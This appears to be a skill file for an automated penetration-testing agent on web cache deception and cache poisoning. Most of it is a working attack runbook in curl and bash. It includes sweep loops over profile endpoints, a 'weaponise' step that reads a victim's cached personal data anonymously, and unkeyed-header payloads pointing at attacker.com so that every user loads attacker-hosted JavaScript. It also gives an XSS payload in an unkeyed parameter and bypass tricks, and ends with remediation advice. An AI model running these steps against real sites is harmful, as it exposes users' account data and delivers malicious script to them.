---
name: cache-deception
description: Web cache deception + web cache poisoning — exfiltrate per-user pages from CDN / proxy cache
triggers: [cache deception, cache poisoning, cdn cache, varnish, cloudfront, fastly, cache-control, akamai]
---

# Web Cache Deception + Cache Poisoning

Two related attacks that both abuse the gap between what the cache *thinks* a URL represents and what the origin *actually* serves.

- **Cache deception**: attacker tricks the cache into storing a sensitive per-user response (`/profile`) under a static-looking URL (`/profile/strix.css`). Subsequent unauthenticated requests to the same URL return the cached personal data.
- **Cache poisoning**: attacker triggers the cache to store an attacker-controlled response under a popular URL; every subsequent legitimate user gets the malicious version.

CWE-525 / CWE-444. Companion to `scan_cache_deception`.

## Attack Surface

**Caches in scope**
- Edge CDNs: Cloudflare, CloudFront, Fastly, Akamai, Bunny, KeyCDN
- Origin caches: Varnish, Nginx `proxy_cache`, Apache `mod_cache`, Squid
- Application caches: Cloudflare Workers KV / Cache API, Vercel Edge Network
- Inline proxies: corporate proxies, ISP transparent caches (rare but devastating)

**Surfaces that exhibit the bug**
- Per-user pages reachable under URL patterns that *look* static: `/profile`, `/account`, `/billing`, `/dashboard`
- Caches that key on path-only or path+host, ignoring cookies / Authorization / query strings
- Origin servers that treat unrecognised extensions as "still serves the dynamic route" (path normalisation)
- Cache rules with overly permissive `Cache-Control: public` or `Cache-Control: max-age=...` headers from origin
- Unkeyed inputs that the origin reflects: `X-Forwarded-Host`, `X-Forwarded-Scheme`, `Forwarded`, `X-Original-URL`, `X-Rewrite-URL`

## Detection Channels

### Cache-deception probe

```bash
# 1. Authenticate as user A, visit /profile, capture the body
curl -s -b 'session=A' 'https://<TARGET>/profile' > /tmp/profile_authed.html

# 2. As user A, visit /profile/strix.css — caches typically store responses with .css extensions
curl -s -b 'session=A' 'https://<TARGET>/profile/strix.css' > /tmp/profile_css.html

# 3. As anonymous user, request the same URL
curl -s 'https://<TARGET>/profile/strix.css' > /tmp/profile_anon.html

# 4. If /tmp/profile_anon.html contains user A's data, you've got cache deception.
diff /tmp/profile_authed.html /tmp/profile_anon.html
```

Other extensions to try: `.css`, `.js`, `.jpg`, `.png`, `.woff`, `.woff2`, `.svg`, `.txt`, `.html`.

Other path-suffix patterns:
- `/profile/strix.css`
- `/profile;strix.css` (semicolon — some caches strip path-parameters)
- `/profile%00.css` (null byte)
- `/profile/..%2fstrix.css` (encoded traversal)
- `/profile/strix.css?strix=1`

### Cache-poisoning probe (unkeyed header reflection)

```bash
# 1. Look for a popular cacheable page
RESP=$(curl -s -i 'https://<TARGET>/' | head -20)
echo "$RESP" | grep -iE 'cache-control|cf-cache-status|age|x-cache'
# CF-Cache-Status: HIT / Age: 123 → cached page

# 2. Inject a header reflected in the response
curl -s -i 'https://<TARGET>/' -H 'X-Forwarded-Host: attacker.com' \
  | grep -i 'attacker.com'

# 3. If reflected: the cache key didn't include X-Forwarded-Host
#    BUT the response body did. Future requests get the poisoned body.
```

### Confirm the cache stored your version

```bash
# Inject a unique marker
curl -s 'https://<TARGET>/' -H 'X-Forwarded-Host: strix-poison-test'

# Request again from a different IP (or wait for the cache to serve the next miss)
sleep 5
curl -s 'https://<TARGET>/' | grep -i 'strix-poison-test'
# If present: cache poisoned.
```

## Operational Runbook

### Step 1 — fingerprint the cache layer

```bash
# Pull headers from a static asset and from a dynamic page
curl -sI 'https://<TARGET>/static/logo.png' | grep -iE 'x-cache|cf-cache-status|age|via|x-served-by|x-cache-hits'
curl -sI 'https://<TARGET>/profile' -b 'session=A' | grep -iE 'cache-control|set-cookie|vary'
```

Common signatures:
- `CF-Cache-Status: HIT` → Cloudflare
- `X-Cache: HIT from cloudfront` → CloudFront
- `X-Served-By: cache-fastly` → Fastly
- `X-Cache: HIT` + `Server: ECS` → AWS S3 + CloudFront
- `Via: varnish` → Varnish (origin or CDN)

Look at `Vary:` and `Cache-Control:` to understand keying.

### Step 2 — cache-deception sweep

```bash
# Endpoint discovery — pages typically vulnerable to deception
PROFILE_ENDPOINTS=( /profile /account /billing /dashboard /settings /me /api/me /api/account )

for endpoint in "${PROFILE_ENDPOINTS[@]}"; do
  for ext in css js jpg png svg woff txt; do
    URL="https://<TARGET>${endpoint}/strix.${ext}"
    SIZE=$(curl -s "$URL" -b 'session=A' -o /tmp/probe -w '%{size_download}')
    SIZE_NO_AUTH=$(curl -s "$URL" -o /tmp/probe2 -w '%{size_download}')
    if [[ "$SIZE" == "$SIZE_NO_AUTH" ]] && [[ "$SIZE" -gt 1000 ]]; then
      echo "DECEPTION CANDIDATE: $URL — same response with/without auth, ${SIZE} bytes"
    fi
  done
done
```

### Step 3 — confirm and weaponise deception

```bash
# A. Authenticate as victim; trigger the deception URL ourselves (simulate victim click)
# Real attacks send the URL via phishing; in test we curl with the victim's session.

# B. Wait for cache to populate (or trigger purge race)
curl -s -b 'session=victim' 'https://<TARGET>/profile/strix.css' >/dev/null

# C. Read the cached response anonymously
curl -s 'https://<TARGET>/profile/strix.css' > /tmp/leak.html

# D. Verify sensitive data is in the leak
grep -iE 'email|name|address|card|api[_-]key' /tmp/leak.html
```

### Step 4 — unkeyed-header poison sweep

```bash
HEADERS_TO_TRY=(
  'X-Forwarded-Host: attacker.com'
  'X-Host: attacker.com'
  'X-Forwarded-Server: attacker.com'
  'X-HTTP-Host-Override: attacker.com'
  'Forwarded: host=attacker.com'
  'X-Original-URL: /admin'
  'X-Rewrite-URL: /admin'
  'X-Forwarded-Scheme: javascript'
  'X-Forwarded-Port: 1337'
)

for header in "${HEADERS_TO_TRY[@]}"; do
  echo "Probing: $header"
  curl -s -i "https://<TARGET>/" -H "$header" -H 'Cache-Buster: '"$RANDOM" \
    | grep -iE 'attacker.com|/admin|javascript:'
done
```

If any header is reflected in the body and the cache is shared, poisoning is feasible.

### Step 5 — exploit cache poison

```bash
# Inject a malicious header that gets reflected as an asset URL
curl -s 'https://<TARGET>/' -H 'X-Forwarded-Host: attacker.com'
# Response body now references https://attacker.com/static/app.js

# The cache stored this poisoned page. Every subsequent user fetching / now serves attacker.com/app.js
# Confirm by waiting for the cache TTL window and re-checking:
sleep 10
curl -s 'https://<TARGET>/' | grep 'attacker.com'
```

### Step 6 — fat GET / parameter-cloaking

```bash
# When the cache strips some query params before keying:
curl 'https://<TARGET>/page?unkeyed_param=<script>alert(1)</script>'
# If `unkeyed_param` is reflected but NOT in the cache key, the cache stores the XSS version under /page.

# Burp's Param Miner extension is the canonical tool for finding unkeyed params.
```

## Bypass Techniques

- **Path normalisation differentials**: origin treats `/profile/foo.css` as `/profile`, cache treats it as static. Confirm with comparison of origin (cache-bypass URL) vs CDN.
- **Method override**: `X-HTTP-Method-Override: GET` on a POST endpoint sometimes routes through the cache.
- **Encoded delimiters**: `%2F` (slash), `%2E` (dot), `%23` (hash) — different normalisation between cache and origin.
- **Vary header gaps**: cache key includes `Vary: Cookie` but not `Vary: Authorization` → JWT-bearing requests get cached against cookie-less keys.

## Validation

1. Cache deception: serve sensitive content (user A's session) to user B via the deception URL.
2. Cache poisoning: inject a unique marker; verify it persists across requests from different IPs / sessions.
3. Document: the cache layer (CDN), the deception URL, the keyed vs unkeyed inputs, the TTL.
4. Confirm via headers: `X-Cache: HIT`, `Age:` > 0, `CF-Cache-Status: HIT`.

## False Positives

- The deception URL returns a 404 / generic error → origin path-normalisation rejected the URL before caching.
- Cache rule explicitly `Cache-Control: private, no-store` → never cached. No deception.
- Unkeyed header reflected but cache rule blocks caching of pages with reflective behaviour (smart CDNs).
- Asset URL contains a per-user nonce / hash → CDN won't share across users despite path match.

## Impact

- **Cache deception**: mass account-data exfil. One viral phishing link → tens of thousands of cached profile leaks.
- **Cache poisoning**: persistent stored XSS / open-redirect / SSRF served to every user. Worst-case: poison the JS bundle URL → attacker JS executes in every browser.
- **Identity confusion**: poison cache to mix users' sessions / responses (DoS-by-incorrect-content).

## Remediation

1. **Cache only what's safe**: explicit allow-list of cacheable paths at the CDN; default `private, no-store`.
2. **Match keys to content**: include `Authorization` / session cookie / `Vary: *` in cache key for any page that *might* be per-user.
3. **Origin path normalisation**: serve a 404 for `/profile/foo.css` style URLs unless `foo.css` is a real static asset.
4. **Strip unkeyed headers**: reject or normalise `X-Forwarded-Host` / `X-Original-URL` at the edge.
5. **Add `Vary: Cookie, Authorization`** on dynamic responses where they matter.
6. **Cache-Buster on auth flows**: append a per-request token (`?_t=$RANDOM`) to URLs that absolutely shouldn't be cached.

## Pro Tips

1. Use Param Miner (Burp extension) for unkeyed-input discovery — far faster than manual sweeps.
2. CloudFront's default cache key is *path only* — anything in CF-only configs is high-yield for deception.
3. Cloudflare's "Cache Everything" page rule + a `/profile` deception probe = the canonical 1-minute audit.
4. Test deception on **static asset extensions you've confirmed are cached** (visit `/static/logo.png` and check `CF-Cache-Status`); use those extensions.
5. The cache persists across the engagement — when you confirm a finding, also confirm the cache TTL so the report knows how long the data was leaked.

## Summary

Cache deception leaks sensitive responses; cache poisoning serves malicious ones. Both come from the cache and the origin disagreeing about what a URL means. Fix by matching cache keys to content, normalising paths, and defaulting to no-store for anything personal.
